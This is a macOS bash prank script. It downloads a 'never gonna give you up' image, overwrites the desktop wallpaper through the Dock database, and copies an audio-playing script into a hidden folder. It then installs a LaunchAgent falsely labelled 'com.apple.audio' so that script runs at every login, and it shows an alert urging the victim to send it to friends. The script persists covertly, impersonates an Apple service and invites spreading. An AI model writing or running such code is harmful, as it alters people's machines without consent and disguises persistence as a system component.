#!/bin/bash

mkdir $HOME/Library/Containers/

mkdir $HOME/Library/Containers/.succmytoes

curl -O https://img02.deviantart.net/3eba/i/2009/227/6/6/never_gonna_give_you_up_by_lightfantastic.jpg

mv never_gonna_give_you_up_by_lightfantastic.jpg $HOME/Library/Containers/.succmytoes/x.png

sqlite3 /$HOME/Library/Application\ Support/Dock/desktoppicture.db "update data set value = '/Users/$USER/x.png'" && killall Dock

cp hit.mp3 $HOME/Library/Containers/.succmytoes

cp song.sh $HOME/Library/Containers/.succmytoes

chmod +x $HOME/Library/Containers/.succmytoes/song.sh

mkdir $HOME/Library/LaunchAgents

#Write the .plist to LaunchAgents
echo '
<plist version="1.0">
    <dict>
    <key>Label</key>
        <string>com.apple.audio</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>'$HOME'/Library/Containers/.succmytoes/song.sh</string>
    </array>
    <key>RunAtLoad</key>
        <true/>
    <key>AbandonProcessGroup</key>
        <true/>
    </dict>
</plist>
' > $HOME/Library/LaunchAgents/com.apple.audio.plist

#Load the LaunchAgent
launchctl load $HOME/Library/LaunchAgents/com.apple.audio.plist

osascript << EOF
tell application "System Events" 
display alert "This is a wallpaper prank! Send it to your friends!" buttons {"Sounds good."}
end tell
EOF
